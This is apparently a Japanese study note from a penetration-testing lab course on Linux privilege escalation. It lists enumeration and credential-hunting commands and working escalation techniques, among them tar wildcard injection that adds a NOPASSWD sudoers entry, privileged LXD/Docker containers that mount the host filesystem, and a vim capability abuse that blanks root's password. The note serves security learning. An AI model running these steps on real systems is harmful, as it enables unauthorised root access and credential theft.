
# 列挙 Enumeration



| **チェック項目**                             | **説明 (何を／なぜ調べるか)**                                                                                                                                                                    | **代表的なコマンド・場所**                                                                      |
| -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **OS バージョン**                           | 使用されているディストリビューションを知ることで、利用可能なツールや、既知の脆弱性に関する情報が得られる                                                                                                                                  | `cat /etc/*release`<br>`uname -a`                                                    |
| **カーネル バージョン**                         | カーネルエクスプロイトはシステムを不安定にさせたり、完全にクラッシュさせる危険もあるため、運用中の環境では注意が必要                                                                                                                            | `uname -r`                                                                           |
| **実行中サービス**                            | 特に root 権限で動作しているサービスに注目する<br>設定ミスや脆弱性のあるサービスは、昇格の足掛かりになる                                                                                                                             | `ps aux \| grep root`<br>`ss -ltnp`<br>`systemctl list-units`                        |
| **インストール済みパッケージ**                      | 古い・脆弱なパッケージがインストールされていないか確認する                                                                                                                                                         | Debian 系 `dpkg -l` <br>RHEL 系 `rpm -qa`                                              |
| **ログイン中ユーザー／プロセス**                     | 他のユーザーがログインしている場合、横移動のチャンスがある                                                                                                                                                         | `w`<br>`who`<br>`ps au`                                                              |
| **ホームディレクトリ調査**                        | 他ユーザーのホームディレクトリが読み取り可能かを確認する<br>SSHキー<br>設定ファイル<br>.bash_history（コマンド履歴）                                                                                                              | `ls -la /home/*`<br>                                                                 |
| **コマンド履歴**                             | <br>ユーザーがどんな操作をしていたかを確認することで、権限昇格のヒントが得られる可能性がある                                                                                                                                      | `cat .bash_history`<br>`history`                                                     |
| **SSH キーの有無**                          | 自ユーザーの .ssh ディレクトリを確認<br>外部から SSH 接続が可能ならば、安定したシェルを得るために利用できる                                                                                                                         | `ls -la ~/.ssh`                                                                      |
| **sudo 権限**                            | NOPASSWDだったら、パスワードなしで sudo が使えかも<br>sudo su が使えれば即 root シェルが取れる                                                                                                                       | `sudo -l`                                                                            |
| **設定ファイル (.conf, .config)**            | .conf や .config ファイルには、ユーザー名やパスワードなどの機密情報が含まれていることがある                                                                                                                                 | grep -Rni -e 'pass' /etc 2>/dev/null<br><br>grep -Rni -e 'pass' /var/log 2>/dev/null |
| **/etc/shadow 可読性**                    | shadow ファイルにアクセスできる場合、パスワードハッシュを取得してオフラインクラックが可能                                                                                                                                      | `ls -l /etc/shadow`                                                                  |
| **/etc/passwd にハッシュ**                  | まれに /etc/passwd ファイルにハッシュが記載されていることがあり、これもクラック対象になる<br>特に、組み込み機器やルーターでは見かけることがある                                                                                                      | `cat /etc/passwd`                                                                    |
| **cron ジョブ**                           | cron ジョブは通常、相対パスの使用やアクセス権の設定ミスなど、他の設定ミスと組み合わせることで、cron ジョブの実行時に権限昇格を引き起こすために悪用される可能性がある<br>backup ファイルは実行権限を持っており、かつ world 実行可能なことから、設定次第で権限昇格の足掛かりになる                                | `ls -la /etc/cron.*`<br>`crontab -l`                                                 |
| **アンマウントされたFS / 追加ドライブ**               | 新たなドライブやマウントされていないファイルシステムを発見して、それをマウントできる場合、パスワード、機密ファイル、バックアップなどが格納されている可能性がある<br>それらを利用して権限昇格を図ることができる                                                                             | `lsblk`<br>`mount`                                                                   |
| **SETUID/SETGID バイナリ**                 | SETUID や SETGID が設定されたバイナリは、通常ユーザーが root の権限でプログラムを実行できるようにするためのもの<br>これらのバイナリの多くは、不正に利用して root シェルを得ることができる機能を内包していることがある                                                            | find / -type f -perm -04000 -ls 2>/dev/null                                          |
| **書き込み可能ディレクトリ**                       | ツールをダウンロード・配置する必要がある場合、どのディレクトリに書き込めるかを把握しておくことが重要<br>特に cron ジョブでファイルを扱うディレクトリが書き込み可能な場合、ジョブの頻度や挙動を把握するヒントにもなり、スクリプト自体が書き込み可能ならば改変による権限昇格のチャンスにもつながる                                 | `find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null`                        |
| **書き込み可能ファイル**                         | スクリプトや設定ファイルに対して「誰でも書き込み可能（world-writable）」なファイルが存在するかを確認する<br>設定ファイルを改変するのはリスクが高いものの、小さな変更でアクセスの突破口ができるケースもある<br>特に、cron で root によって実行されているスクリプトが書き込み可能であれば、それを書き換えることでコードを差し込むことが可能 | `find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null`                        |
| **PAMの設定を利用した認証バイパス**・su権限の委譲 / 管理用の設定 | Linuxの認証システムであるPAM (Pluggable Authentication Modules) の設定をカスタマイズして、特定の条件下でパスワード認証を「バイパス（迂回）」が存在するのかを調べる<br>もしかしたら、パスワードなしで横展開できるかもしれない                                                | cat /etc/pam.d/su                                                                    |
| NFSに書き込むことができるのかを調べる                   | ユーザー ID (**id (username)** )を使用してファイルを書き込み、**suid バイナリを作成**してこのユーザーとして実行権限を取得できるかも<br>[[Mail01#Lateral Movement]]                                                               | 1. NFSがあるか<br>2. NFSに書き込み権限があるか                                                      |

## Dockerの判別
今の環境がDockerなのかどうかを確かめる
　```sh
sh -c '[ -f /.dockerenv ]&&{ echo "→ container: docker (/.dockerenv)"; exit; }; \
[ -f /.containerenv ]&&{ echo "→ container: podman/oci (/.containerenv)"; exit; }; \
t=$(grep -Eo "docker|kubepods|containerd|podman|lxc" /proc/1/cgroup 2>/dev/null|head -1); \
[ -n "$t" ]&&{ echo "→ container (cgroup: $t)"; exit; }; \
[ -d /var/run/secrets/kubernetes.io ]&&{ echo "→ container: kubernetes pod"; exit; }; \
command -v systemd-detect-virt >/dev/null 2>&1 && systemd-detect-virt --container >/dev/null 2>&1 && { echo "→ container: $(systemd-detect-virt --container)"; exit; }; \
p1=$(ps -p 1 -o comm= 2>/dev/null); case "$p1" in systemd|init) echo "→ host (pid1=$p1)";; *) echo "→ maybe container (pid1=$p1)";; esac'
```
# 情報収集
- まずLinuxにリバースシェルで接続できている状況

## 環境の洗い出し

| 埋めるべき質問                             | 試すべきコマンド                                                                      | 回答       | メモ  |
| ----------------------------------- | ----------------------------------------------------------------------------- | -------- | --- |
| どのユーザーとして実行してる？                     | whoami                                                                        |          |     |
| ユーザーはどのグループに所属している？                 | id                                                                            |          |     |
| サーバーの名前は何？命名規則から何かわかる？              | hostname                                                                      |          |     |
| どのサブネットに侵入した？NICは？                  | ifconfig                                                                      |          |     |
| ユーザーはsudo権限を持ってる？                   | sudo -l                                                                       |          |     |
| 他にどんなユーザーいる？(横展開からの権限昇格)            | cat /etc/passwd                                                               |          |     |
| 誰がhomeフォルダにフォルダある？(横展開からの権限昇格)      | ls /home                                                                      |          |     |
| root権限を持つSUIDの列挙                    | find / -type f -perm -04000 -ls 2>/dev/null                                   |          |     |
| sudoグループにはどのユーザーがいる？                | getent group sudo                                                             |          |     |
| ユーザーのPATHの確認(PATHが間違ってたら権限昇格できるかも？) | echo $PATH                                                                    |          |     |
| 環境変数の確認(パスワードとかあるかも？)               | env                                                                           |          |     |
| システム上のドライブと共有は？(権限昇格の認証情報あるかも？)     | lsblk                                                                         |          |     |
| マウントされたファイルシステムは？(機密情報あるかも？)        | df -h                                                                         |          |     |
| アンマウントされたファイルシステムは？                 | cat /etc/fstab \| grep -v "#" \| column -t                                    |          |     |
| アンマウントされてるドライブとかある？(機密情報あるかも？)      | cat /etc/fstab                                                                |          |     |
| 接続してるプリンターは？(印刷ジョブに機密情報ない？)         | lpstat                                                                        |          |     |
| OSとOSのバージョンは何？                      | cat /etc/os-release                                                           |          |     |
| OSは脆弱性を抱えてる？                        |                                                                               | Yes / No |     |
| カーネルのバージョンは？                        | uname -a                                                                      |          |     |
| カーネルバージョンに脆弱性はある？                   |                                                                               | Yes / No |     |
| CPUタイプ/バージョンなどの追加情報                 | lscpu                                                                         |          |     |
| サーバーにあるログインシェルは何？                   | cat /etc/shells                                                               |          |     |
| 内部インターネットにDNSない？                    | cat /etc/resolv.conf                                                          |          |     |
| ターゲットが通信していた他のホストを確認                | arp -a                                                                        |          |     |
| 隠しファイルは？                            | `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null \| grep htb-student` |          |     |
| 隠しフォルダは？                            | `find / -type d -name ".*" -ls 2>/dev/null`                                   |          |     |
| 一時フォルダは？                            | ls -l /tmp /var/tmp /dev/shm                                                  |          |     |

## サービスと内部構造の洗い出し
- 可能な限り多くのネットワーク情報を収集することも重要
- システムに他のインターフェースはある？
	- もしあれば、以前は攻撃ホストから到達できなかった別のサブネットに侵入するために使用できる可能性がある
	- ip a コマンドまたは ifconfig で行いますが、net-tools パッケージが存在しない場合、このコマンドは特定のシステムでは機能しない場合がある

| 埋めるべき質問                                              | 試すべきコマンド                                                                                                                                                                                                                                                                                                   | 回答  | メモ  |
| ---------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- | --- |
| どんなソフトウェアが動いてる?                                      | ps aux<br>top<br>systemctl list-units --type=service --state=running<br>dpkg -l                                                                                                                                                                                                                            |     |     |
| 実際に動いてるサービス?                                         | netstat -tulnp<br>systemctl status サービス名                                                                                                                                                                                                                                                                   |     |     |
| どのネットワークポートが開いてる?                                    | netstat -tulnp<br>ss -tulnp                                                                                                                                                                                                                                                                                |     |     |
| 誰が今使っているのか？                                          | w<br>who<br>users                                                                                                                                                                                                                                                                                          |     |     |
| 過去に誰が使ってたのか？                                         | lastlog<br>last<br>ac                                                                                                                                                                                                                                                                                      |     |     |
| パスワードに関するルールはあるか？（複雑さ、有効期限など）                        | cat /etc/login.defs<br>cat /etc/pam.d/common-password                                                                                                                                                                                                                                                      |     |     |
| ADの一部？                                               | realm discover<br>grep -i "kerberos" /etc/pam.d/*                                                                                                                                                                                                                                                          |     |     |
| 有用な情報はないか？（パスワード、設定など）                               | grep -riE "password"                                                                                                                                                                                                                                                                                       |     |     |
| どんなファイルが変更された？                                       | find / -type f -mtime -7 (7日以内に変更されたファイル)<br>find / -type f -printf '%TY-%Tm-%Td %TT %p\n                                                                                                                                                                                                                  |     |     |
| 定期的な変更はあるか？（Cronジョブの可能性)                             | ls -la /etc/cron*<br>cat /etc/crontab                                                                                                                                                                                                                                                                      |     |     |
| ネットワーク設定はどうなっているか？                                   | ip a<br>ifconfig                                                                                                                                                                                                                                                                                           |     |     |
| ホスト名とIPアドレスの対応はどうなっているか？                             | cat /etc/hosts<br>nslookup [ホスト名]                                                                                                                                                                                                                                                                          |     |     |
| 内部ネットワークや外部への接続はあるか？                                 | netstat -tulnp<br>ss -tulnp                                                                                                                                                                                                                                                                                |     |     |
| 便利なツールはインストールされている？                                  | for bin in nc python python3 perl ruby nmap tcpdump gcc wget curl socat; do which $bin && echo "[+] Found: $bin"; done                                                                                                                                                                                     |     |     |
| インストールしてるpythonバージョン                                 | `ls /usr/bin/python*`                                                                                                                                                                                                                                                                                      |     |     |
| コマンド履歴からパスワードなどの秘密情報を見つけられるか？<br>履歴ファイルの検索           | history<br>`find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null`                                                                                                                                                                                                            |     |     |
| 乗っ取り可能な Cron ジョブは存在するか？                              | `(ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ /etc/cron.hourly/; cat /etc/crontab; cat /var/spool/cron/crontabs/*; systemctl list-timers; find /etc/cron* -type f -perm -0111) 2>/dev/null`                                                                                               |     |     |
| インストール済みパッケージ                                        | `apt list --installed \| tr "/" " " \| cut -d" " -f1,3 \| sed 's/[0-9]://g' \| tee -a installed_pkgs.list`                                                                                                                                                                                                 |     |     |
| sudoのバージョン                                           | sudo -V                                                                                                                                                                                                                                                                                                    |     |     |
| バイナリの一覧表示                                            | ls -l /bin /usr/bin/ /usr/sbin/ /opt/<br>find / -type f -executable -print                                                                                                                                                                                                                                 |     |     |
| GTFOBinsに該当するSUIDの一覧                                 | `for i in $(curl -s https://gtfobins.github.io/ \| html2text \| cut -d" " -f1 \| sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done`<br>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null<br>find / -uid 0 -perm -6000 -type f 2>/dev/null |     |     |
| システムコールの追跡                                           | strace ping -c1 10.129.112.20                                                                                                                                                                                                                                                                              |     |     |
| システム全体の設定ファイルを検索(サービスの設定や機密情報が含まれている可能性がある)          | `find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null`                                                                                                                                                                                                                        |     |     |
| システム全体にあるシェルスクリプトを検索                                 | `find / -type f -name "*.sh" 2>/dev/null \| grep -v "src\|snap\|share"`                                                                                                                                                                                                                                    |     |     |
| 実行中のプロセスをユーザーごとに表示する(root ユーザーで実行されているプロセスは、特に注意が必要) | ps aux \| grep root<br>ps -ef<br>top -u root                                                                                                                                                                                                                                                               |     |     |
| ケーパビリティの列挙                                           | `find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} ;`                                                                                                                                                                                                                         |     |     |

## 資格情報の探索
- 資格情報は、他のユーザーやrootへの昇格、データベースや環境内の他のシステムへのアクセスに役立つ可能性がある

| 埋めるべき質問                                                   | 試すべきコマンド                                                                                              | 回答  | メモ  |
| --------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- | --- | --- |
| Webルート(/var ディレクトリ)には、データベースの資格情報などの他の種類の資格情報が含まれている場合がある | find / -type f -iname "wp-config.php" 2>/dev/null<br>cat wp-config.php \| grep 'DB_USER\|DB_PASSWORD' |     |     |
| スプールディレクトリやメールディレクトリにも、価値のある情報や資格情報が含まれている可能性がある          | `find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`                                     |     |     |
| SSHキーの表示                                                  | ls ~/.ssh                                                                                             |     |     |
## PATHの悪用
- PATH で指定されたディレクトリにスクリプトまたはプログラムを作成システム上のどのディレクトリからでも実行できるようになる
- `/usr/local/sbin`に作成された conncheck スクリプトは、PATH で指定されたディレクトリに作成されたため、/tmp ディレクトリにいても実行できる
- ユーザーの PATH に . を追加すると、現在の作業ディレクトリがリストに追加される
- たとえば、ユーザーのパスを変更できる場合、ls などの一般的なバイナリをリバースシェルなどの悪意のあるスクリプトに置き換えることができる
- `PATH=.:$PATH` というコマンドを発行して PATH に `.` を追加し、次に export PATH を実行すると、ファイルの名前を入力するだけで、現在の作業ディレクトリにあるバイナリを実行できるようになる
```sh
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH

.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

この例では、ls コマンドが入力されたときに単純な echo コマンドを実行するようにパスを変更する
```shell-session
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
```

```shell-session
htb_student@NIX02:~$ ls

PATH ABUSE!!
```


# 権限に基づく権限昇格
## ワイルドカードの悪用
- ワイルドカードが悪用されて権限昇格につながる例として、アーカイブの作成/抽出のための一般的なプログラムである tar コマンドがある
- tar コマンド
	- `--checkpoint-action` オプションを使用すると、チェックポイントに到達したときに EXEC アクションを実行できる
	- つまり、tar コマンドが実行されると、任意のオペレーティングシステムコマンドが一度実行される
	- ワイルドカードが指定されたときに、`--checkpoint=1` および `--checkpoint-action=exec=sh root.sh` がコマンドラインオプションとして tar に渡される

```shell-session
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

|     |                                                                      |
| --- | -------------------------------------------------------------------- |
| 文字  | 意味                                                                   |
| *   | ファイル名内の任意の数の文字に一致するアスタリスク                                            |
| ?   | 単一の文字に一致する                                                           |
| [ ] | ブラケットで囲まれた文字で、定義された位置にある単一の文字に一致する                                   |
| ~   | 先頭のチルダは、ユーザーのホームディレクトリの名前に展開されるか、別のユーザー名が追加されてそのユーザーのホームディレクトリを参照できる |
| -   | ブラケット内のハイフンは、文字の範囲を示す                                                |


## 制限付きシェルからの脱出
- 制限付きシェルとは、ユーザーがコマンドを実行する能力を制限するシェルの一種
- 制限付きシェルでは、ユーザーは特定のコマンドセットのみを実行できるか、特定のディレクトリでのみコマンドを実行できる
- 制限付きシェルの一般的な例としては、Linux の rbash シェルや Windows の「制限付きアクセスシェル」がある

RBASH
- 制限付き Bourne shell (rbash) は、Bourne shell の制限付きバージョンであり、Linux の標準的なコマンドラインインタプリタ
- rbash は、ディレクトリの変更、環境変数の設定または変更、他のディレクトリでのコマンドの実行など、Bourne shell の特定の機能を使用するユーザーの能力を制限する
RKSH
- 制限付き Korn shell (rksh) は、Korn shell の制限付きバージョンであり、別の標準的なコマンドラインインタプリタ
- rksh シェルは、他のディレクトリでのコマンドの実行、シェル関数の作成または変更、シェル環境の変更など、Korn shell の特定の機能を使用するユーザーの能力を制限する
RZSH
- 制限付き Z shell (rzsh) は、Z shell の制限付きバージョンであり、最も強力で柔軟なコマンドラインインタプリタ
- rzsh シェルは、シェルスクリプトの実行、エイリアスの定義、シェル環境の変更など、Z shell の特定の機能を使用するユーザーの能力を制限する

脱出
- 場合によっては、シェルが受け入れるコマンドラインまたはその他の入力にコマンドを注入することで、制限付きシェルから脱出できる場合がある

コマンドインジェクション
- ls コマンドが -l 引数、および pwd コマンドの出力とともに実行される
- pwd コマンドはシェルによって制限されていないため、シェルが pwd コマンドを直接実行することを許可していなくても、このコマンドを実行して現在の作業ディレクトリを確認できる
```sh
ls -l `pwd`
```

コマンド置換
- バッククォート（ `コマンド` ）を使ってコマンドを実行する。
- シェルがバッククォートを許可している場合、制限を回避できる可能性がある。
コマンドチェイン
- セミコロン（;）や縦棒（|）などを使って複数のコマンドを連結する。
- セミコロンで分けた中に制限されていないコマンドを混ぜれば、脱出できる可能性がある。
環境変数
- 環境変数を編集または新規作成し、シェルが実行するコマンドのディレクトリを変更する。
- これにより、シェルを制限されていないコマンドに誘導できる可能性がある。
シェル関数
- 制限されていないコマンドを実行するシェル関数を定義して呼び出す。
- シェルが関数定義と実行を許可している場合、そこから脱出できる可能性がある。

1.	<flag.txt → flag.txt の中身を読み込む
2.	$(<flag.txt) → 読み込んだ内容を「コマンドの結果」として置換する
3.	echo → それを画面に表示する！
```sh
echo $(<flag.txt)
```


## SUID・Sudo権限の悪用
- 実行時の Set User ID（setuid）権限を使用すると、ユーザーは別のユーザー（通常はroot）の権限でプログラムまたはスクリプトを実行できる
- setuid ビットは s として表示される
```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
```

- SETUID ビットが設定されたプログラムをリバースエンジニアリングし、脆弱性を特定して、これを悪用して特権を昇格させることができる
- 多くのプログラムには、コマンドを実行するために利用できる追加機能があり、setuid ビットが設定されている場合、これらの機能を目的のために使用できる
- Set-Group-ID（setgid）権限は、バイナリを作成したグループの一員であるかのようにバイナリを実行できるもう1つの特別な権限
	- setuidバイナリと同じ方法で、特権を昇格させるために利用できる
SetGIDの確認
```sh
find / -uid 0 -perm -6000 -type f 2>/dev/null
```

- SUIDで列挙した時に、一般的に設定されているバイナリ
	- そのため、注目すべきは、これ以外のバイナリってこと。
	- ほとんどの Linux でデフォルト設定されているもの
		- `/usr/bin/passwd`
		- `/usr/bin/su`
		- `/usr/bin/sudo`
		- `/usr/bin/mount`
		- `/usr/bin/umount`
		- `/usr/bin/newgrp`
		- `/usr/bin/chsh`
		- `/usr/bin/chfn`
		- `/usr/bin/gpasswd`
		- `/usr/bin/fusermount`
	- 特定の環境や、設定によって含まれることがあるバイナリ
		- `/usr/lib/openssh/ssh-keysign`
		- `/usr/lib/dbus-1.0/dbus-daemon-launch-helper`
		- `/usr/sbin/pppd`
		- `/usr/lib/xorg/Xorg.wrap

**GTFOBins**
- Linux : https://gtfobins.github.io
- Windows : https://lolbas-project.github.io/#

## 特権グループ LXC / LXD
- LXDはDockerに似ており、Ubuntuのコンテナマネージャー
- インストールすると、すべてのユーザーがLXDグループに追加される
	- LXDコンテナを作成し、特権を与え、`/mnt/root`でホストファイルシステムにアクセスすることで、特権を昇格できる

LXDがインストールされていると、idの結果こんな感じになる
```shell-session
id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

LXDコンテナを作成することでローカルでのroot権限を取得する
早速コンテナを作成する
1. Alpine imageを解凍する
```shell-session
unzip alpine.zip 
```

2. LXDの初期化プロセスを開始する。各プロンプトに対してデフォルトを選択する
```sh
lxd init
```

3. ローカルイメージをインポートする
```sh
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

4. コンテナをUIDマッピングなしで実行するために、security.privilegedをtrueに設定する
- これによって、ローカルでもrootを取得する
```sh
lxc init alpine r00t -c security.privileged=true
```

5. ホストファイルシステムをマウントする
```sh
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

6. コンテナインスタンス内でシェルを生成する
- これで、マウントされたホストファイルシステムをrootとして閲覧できる
- たとえば、ホスト上のrootディレクトリの内容にアクセスするには、`cd /mnt/root/root`と入力する
```sh
lxc start r00t
~/64-bit Alpine$ lxc exec r00t /bin/sh
```

### Docker
- ユーザーをdockerグループに配置することは、パスワードを必要とせずにファイルシステムへのrootレベルのアクセスと本質的に同等
- dockerグループのメンバーは、新しいdockerコンテナを起動できる
	- コマンドは、ホストファイルシステムの/rootディレクトリがボリュームとしてマウントされた新しいDockerインスタンスを作成する
	- コンテナが起動されると、マウントされたディレクトリを参照して、rootユーザーのSSHキーを取得または追加できる
```sh
docker run -v /root:/mnt -it ubuntu
```

### Disk
- diskグループ内のユーザーは、通常オペレーティングシステムで使用されるメインデバイスである`/dev/sda1`など、`/dev`に含まれるすべてのデバイスへのフルアクセス権を持っている
- これらの特権を持つ攻撃者は、debugfsを使用して、rootレベルの特権でファイルシステム全体にアクセスできる
- Dockerグループの例と同様に、SSHキーや資格情報を取得したり、ユーザーを追加したりするために、これを利用できる

### ADM
- admグループのメンバーは、`/var/log`に保存されているすべてのログを読み取ることができる
- 直接rootアクセスを許可するものではないが、ログファイルに保存されている機密データを収集したり、ユーザーアクションと実行中のcronジョブを列挙したりするために利用できる
```sh
id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```


## ケーパビリティ
### 概要
- Linuxオペレーティングシステムのセキュリティ機能の一つ
- プロセスに対して特定の権限を選択的に付与し、通常は制限されている特定の操作を実行させることが可能になる
	- どのプロセスがどの特権にアクセスできるかをより細かく制御できるため、セキュリティが向上する
- 攻撃者による悪用と、誤設定が起きることがある
こんな感じで実行ファイルにケーパビリティを設定することができる
```sh
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

- バイナリ（実行ファイル）にケーパビリティが設定されると、そのバイナリはケーパビリティなしでは実行できない特定の操作を実行できるようになる
	- cap_net_bind_serviceケーパビリティがバイナリに設定されている場合、通常は特権が必要なネットワークポートへのバインド（接続待受）が可能になる

**代表的なケーパビリティとその説明**

|                      |                                                                                          |
| -------------------- | ---------------------------------------------------------------------------------------- |
| ケーパビリティ              | 説明                                                                                       |
| cap_sys_admin        | システムファイルの変更やシステム設定の変更など、管理者権限での操作を実行できる。                                                 |
| cap_sys_chroot       | 現在のプロセスのルートディレクトリを変更できる。これにより、通常アクセスできないファイルやディレクトリにアクセス可能になる。                           |
| cap_sys_ptrace       | 他のプロセスにアタッチしてデバッグできる。これにより、機密情報にアクセスしたり、他のプロセスの動作を変更したりできる可能性がある。                        |
| cap_sys_nice         | プロセスの優先度を上げ下げできる。これにより、通常制限されているリソースへのアクセスが可能になる可能性がある。                                  |
| cap_sys_time         | システムクロックを変更できる。これにより、タイムスタンプを操作したり、他のプロセスを予期しない動作にさせたりする可能性がある。                          |
| cap_sys_resource     | 最大オープンファイルディスクリプタ数や最大割り当て可能メモリ量など、システムリソース制限を変更できる。                                      |
| cap_sys_module       | カーネルモジュールをロード・アンロードできる。これにより、OSの動作を変更したり、機密情報にアクセスしたりできる可能性がある。                          |
| cap_net_bind_service | ネットワークポートにバインド（接続待受）できる。通常1024番未満のポートへのバインドには特権が必要だが、これを許可する。機密情報へのアクセスや不正操作につながる可能性がある。 |
Linuxでsetcapコマンドを使用して実行ファイルにケーパビリティを設定する場合、設定したいケーパビリティと割り当てたい値（権限セットを示すフラグ）を指定する必要がある

setcapコマンドで使用できる値の例と、それらが何をするかの簡単な説明
- e (Effective), p (Permitted), i (Inheritable) はケーパビリティの3つのセット
- + は追加、- は削除、= は指定されたセットのみを設定することを意味する

|     |                                                                                                                                                                          |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 値   | 説明                                                                                                                                                                       |
| =   | 実行ファイルに指定されたケーパビリティを設定しますが、どの権限セット（Effective, Permitted, Inheritable）にも追加しません。これは、以前に設定されたケーパビリティをクリアしたい場合に便利です。（例: setcap cap_net_raw= /bin/ping）                       |
| +ep | 指定されたケーパビリティを、実行ファイルの **Effective (有効)** および **Permitted (許可)** 権限セットに追加します。これにより、実行ファイルはそのケーパビリティが許可するアクションを実行できますが、許可されていないアクションは実行できません。                              |
| +ei | 指定されたケーパビリティを、実行ファイルの **Effective (有効)** および **Inheritable (継承可能)** 権限セットに追加します。これにより、実行ファイルはそのケーパビリティが許可するアクションを実行でき、その実行ファイルから起動された子プロセスもそのケーパビリティを継承して同じアクションを実行できます。 |
| +p  | 指定されたケーパビリティを、実行ファイルの **Permitted (許可)** 権限セットに追加します。これにより、実行ファイルはそのケーパビリティが許可するアクションを実行できますが、Effectiveセットには追加されないため、プログラム内で明示的に有効化する必要があります。また、子プロセスに継承させることも防ぎます。      |

### 攻撃
#### ケーパビリティの列挙
```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

権限昇格できる可能性のあるケーパビリティ一覧

| ケーパビリティ          | 説明                                                                                           |
| ---------------- | -------------------------------------------------------------------------------------------- |
| cap_setuid       | プロセスが自身の **Effective User ID (実効ユーザーID)** を設定できるようにする。これを利用して、rootユーザーを含む他のユーザーの権限を取得できます。   |
| cap_setgid       | プロセスが自身の **Effective Group ID (実効グループID)** を設定できるようにします。これを利用して、rootグループを含む他のグループの権限を取得できます。 |
| cap_sys_admin    | システム設定の変更やファイルシステムのマウント/アンマウントなど、rootユーザー用に予約されている多くのアクションを実行する能力を含む、広範な管理者権限を提供します。         |
| cap_dac_override | ファイルの読み取り、書き込み、実行に関する **パーミッションチェックをバイパス** できます。これにより、アクセス権がないファイルにもアクセスできてしまいます。            |
#### 攻撃
- もし低権限のアカウントでシステムにアクセスできた後、cap_dac_overrideケーパビリティが設定されたバイナリを発見した場合

例 : /usr/bin/vim.basicバイナリはsudoのような特別な権限なしで実行される
- このバイナリにはcap_dac_override=eipケーパビリティが設定されているため、ファイルのパーミッションチェックをバイパスできる
- このバイナリを実行するユーザーは、本来アクセスできないファイルに対しても読み書きが可能になる
ケーパビリティの確認
```shell-session
getcap /usr/bin/vim.basic
> /usr/bin/vim.basic cap_dac_override=eip
```

ファイルの読み書きできる
```shell-session
/usr/bin/vim.basic /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```
/etc/passwdで、`root:x:0:0:root:/root:/bin/bash` ⇨ `root::0:0:root:/root:/bin/bash`にすることでrootにパスワードなしでログインできるようになる


# サービスに基づく権限昇格
## Cronjobの悪用
- cronはみんな知ってる定期的にタスクを実行するやつやね
- rootユーザーのcrontabは、普通、rootユーザーかsudo権限を持つユーザーのみ編集できるけど、rootで実行される誰でも書き込み可能なスクリプトとかが見つかることがある、こういうのが見つかると悪用できる
- `/dmz-backups`ディレクトリにあるbackup.shファイルは興味深く、クロンジョブで実行されている可能性がある

Cron Jobの悪用例: 書き込み可能なファイルを探す
```sh
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

**pspy**
- root権限がなくても実行中のプロセスを表示することで、クロンジョブが実行されていることを確認できる
- このツールを使用すると、他のユーザーが実行したコマンドやクロンジョブなどを確認できる
- /procファイルシステムをスキャンすることで機能する

Cron Jobの悪用例: pspyによるプロセス監視
```sh
./pspy64 -pf -i 1000
```

## コンテナ
- コンテナはオペレーティングシステムレベルで動作し、仮想マシンはハードウェアレベルで動作する
- **LXC/LXD:** LXCはアプリケーションコンテナ、LXDはシステムコンテナです
	- アプリケーションコンテナは、OSを共有
	- LXDは、OSを共有しない
	- このサービスを利用して権限を昇格させるには、lxcまたはlxdグループに属している必要がある

LXD グループに属しているかの確認
```shell-session
id
> uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

 - LXC/LXDを悪用する方法はいくつかある
 - 独自のコンテナを作成してターゲットシステムに転送するか、既存のコンテナを使用することができる

コンテナイメージの確認
```shell-session
cd ContainerImages
ls
> ubuntu-template.tar.xz
```

 - 残念ながら、管理者はセキュリティがほとんどない、または全くないテンプレートを使用することがよくある
 - そのために、まずこのコンテナをイメージとしてインポートする必要がある
```shell-session
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

- このイメージが正常にインポートされたことを確認した後、イメージをインスタンス化し、`security.privileged`フラグとコンテナのルートパスを指定して構成できる
	- この`security.privileged`フラグは、ホスト上で動作できるようにするすべての隔離機能を無効にする
```sh
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

完了したら、コンテナを起動してログインする
